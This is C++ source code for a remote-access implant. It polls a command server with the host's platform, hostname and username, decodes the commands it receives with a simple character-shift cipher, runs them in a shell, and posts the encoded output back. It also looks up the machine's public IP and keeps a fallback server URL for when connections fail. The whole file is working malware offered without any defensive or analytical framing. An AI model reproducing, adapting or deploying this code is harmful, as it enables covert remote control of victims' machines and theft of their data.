#include <iostream>

#include "includes/HTTPRequest.hpp"

#include <string>

#include <stdio.h>

#include <cstring>

std::string reversed(std::string strink) {
    reverse(strink.begin(), strink.end());
    return strink;
}

std::string crypts(std::string strink) {

    for (int i = 0; (i < strink.length()); i++) {
        strink[i] = strink[i] + 2;
    }
    std::string res = reversed(strink);
    //std::string res = strink;
    return res;
}

std::string decrypts(std::string strink) {
    for (int i = 0; (i < strink.length()); i++) {
        strink[i] = strink[i] - 2;
    }
    std::string res = reversed(strink);
    return res;
}

std::string host = "http://127.0.0.1:8080";
int HELLO_INTERVAL = 10;
int IDLE_TIME = 720;
int FAILED_CONNECTIONS = 0;
int MAX_FAILED_CONNECTIONS = 10;
int FETCH_NEW_CONFIG = 120;
std::string backup = "http://7days.quest/";

std::string getOsName() {
  #ifdef _WIN32
  return "Windows 32-bit";
  #elif _WIN64
  return "Windows 64-bit";
  #elif __APPLE__ || __MACH__
  return "Mac OSX";
  #elif __linux__
  return "Linux";
  #elif __FreeBSD__
  return "FreeBSD";
  #elif __unix || __unix__
  return "Unix";
  #else
  return "Other";
  #endif
}

std::string server_hello(std::string HOSTNAME, std::string USERNAME, std::string PLATFORM, std::string UUID) {
  std::string url = host + "/api/" + UUID + "/hello";

  http::Request request(url);
  std::map < std::string, std::string > parameters = {
    {
      "platform",
      PLATFORM
    },
    {
      "hostname",
      HOSTNAME
    },
    {
      "username",
      USERNAME
    }
  };
  const http::Response response = request.send("POST", parameters, {
    "Content-Type: application/x-www-form-urlencoded"
  });
  std::string resp;
  resp = std::string(response.body.begin(), response.body.end());
  std::cout << resp;
  return resp;

}

std::string send_output(std::string out, std::string UUID, std::string cmd) {
  std::string url = host + "/api/" + UUID + "/report";
  //obj.header["content-type"] = "application/x-www-form-urlencoded; charset=utf-8";
  http::Request request(url);
  std::string body = crypts("#/>" + decrypts(cmd) + "\n" + out + "\n");
  std::map < std::string, std::string > parameters = {
    {
      "output",
      body
    }
  };
  const http::Response response = request.send("POST", parameters, {
    "Content-Type: application/x-www-form-urlencoded"
  });
  std::string resp;
  resp = std::string(response.body.begin(), response.body.end());
  return resp;

}

const std::string runcmd(std::string cmd) {

  std::array < char, 2048 > buffer;
  std::string result;

  auto pipe = popen(cmd.c_str(), "r"); // get rid of shared_ptr

  if (!pipe) throw std::runtime_error("popen() failed!");

  while (!feof(pipe)) {
    if (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
      result += buffer.data();
  }

  auto rc = pclose(pipe);

  if (rc == EXIT_SUCCESS) { // == 0

  } else if (rc == EXIT_FAILURE) { // EXIT_FAILURE is not used by all programs, maybe needs some adaptation.

  }
  return std::string {
    result
  };

}

int update_consecutive_failed_connections() {
  FAILED_CONNECTIONS++;
  return 1;
}

std::string get_user(std::string x) {
  if (x == "Linux") {
    char * username = getlogin();
    return username;
  } else if (x == "Windows 32-bit") {
    return "x";
  } else if (x == "Windows 64-bit") {
    return "x";
  } else {
    return "Unknown User";
  }
}

std::string get_ip() {
  http::Request request("http://api.ipify.org/");

  // send a get request
  const http::Response getResponse = request.send("GET");
  std::string resp = std::string(getResponse.body.begin(), getResponse.body.end()) + "\n";
  return resp;

}

std::string get_backup() {
  http::Request request(backup);

  // send a get request
  const http::Response getResponse = request.send("GET");
  std::string resp = std::string(getResponse.body.begin(), getResponse.body.end()) + "\n";
  return resp;
}

std::string gethost_NAME() {
  try {

    char host[256];
    if (gethostname(host, sizeof host) == -1) {
      return "Error.";
    }
    return host;

  } catch (const std::exception & e) {

    return "Error.";

  }
}

std::string PLATFORM = getOsName();
std::string USERNAME = get_user(PLATFORM);
std::string IP = get_ip();
std::string HOSTNAME = gethost_NAME();
std::string UUID1 = USERNAME + PLATFORM + HOSTNAME;
std::string get_UUID(std::string UUID1) {
for (int i = 0; i < UUID1.length();i++) {
    if (UUID1[i] == '.') {
      UUID1[i] = 'f';
    }
    if (UUID1[i] == 'a') {
      UUID1[i] = '9';
    }
    if (UUID1[i] == '1') {
      UUID1[i] = '2';
    }
    if (UUID1[i] == '2') {
      UUID1[i] = '1';
          }
    if (UUID1[i] == 'w') {
      UUID1[i] = 'o';
    }
    if (UUID1[i] == '_') {
      UUID1[i] = 'e';
    }
    if (UUID1[i] == 'r') {
      UUID1[i] = 'j';
    }
    if (UUID1[i] == 'o') {
      UUID1[i] = 'x';
    }
}
return UUID1;
}
std::string UUID = crypts(get_UUID(UUID1));

int main(int argc,
  const char * argv[]) {

  bool idle = false;
  while (1 == 1) {

    try {

    if (FAILED_CONNECTIONS > 10) {
      sleep(IDLE_TIME);
    } else if (FAILED_CONNECTIONS > 100) {
      // fetch backup url
      host = get_backup();
    }
    sleep(HELLO_INTERVAL);
    std::string hel = server_hello(HOSTNAME, USERNAME, PLATFORM, UUID);
    if (hel != "x\n") {
      std::string cmdline = decrypts(hel);
      std::string cmd_res = runcmd(cmdline);
      send_output(cmd_res, UUID, hel);
    }
    else {
        int i = 0;
    }
    }
    catch (...) {
      int i = 0;
    }
  }
}
